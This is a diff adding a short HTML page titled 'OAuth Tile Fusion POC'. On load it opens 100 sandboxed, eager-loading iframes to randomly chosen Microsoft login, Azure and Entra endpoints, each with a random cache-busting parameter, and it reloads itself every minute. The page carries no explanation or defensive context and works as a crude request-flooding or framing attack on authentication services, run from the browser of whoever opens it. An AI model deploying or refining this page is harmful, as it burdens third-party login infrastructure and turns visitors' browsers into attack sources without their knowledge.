@@ -1,0 +1,59 @@
+<!doctype html>
+<html>
+<head>
+  <title>OAuth Tile Fusion POC</title>
+  <style>
+    body {
+      background: black;
+      color: #00ff00;
+      font-family: monospace;
+    }
+    iframe {
+      width: 240px;
+      height: 160px;
+      margin: 2px;
+      border: 1px solid lime;
+      background: #111;
+    }
+    .container {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+    }
+  </style>
+  <script>
+    setTimeout(() => location.reload(), 60000);
+    const heavyUrls = [
+      "https://login.microsoftonline.us",
+      "https://login.microsoftonline.com",
+      "https://portal.azure.com",
+      "https://entra.microsoft.com",
+      "https://mfa.login.microsoftonline.com",
+      "https://aad.portal.azure.com",
+      "https://account.activedirectory.windowsazure.com",
+      "https://signup.live.com",
+      "https://news.microsoft.com",
+      "https://news.microsoft.com/en-us/features/"
+    ];
+
+    function getIframes() {
+      const container = document.getElementById('tiles');
+      for (let i = 0; i < 100; i++) {
+        const frame = document.createElement('iframe');
+        const rand = Math.floor(Math.random() * 999999);
+        const url = heavyUrls[Math.floor(Math.random() * heavyUrls.length)];
+        frame.src = url + "?load=" + rand;
+        frame.loading = "eager";
+        frame.sandbox = "allow-scripts allow-same-origin allow-forms";
+        container.appendChild(frame);
+      }
+    }
+
+    window.onload = getIframes;
+  </script>
+</head>
+<body>
+  <h3>OAuth Tile Fusion POC @ {{TIME}}</h3>
+  <div class="container" id="tiles"></div>
+</body>
+</html>
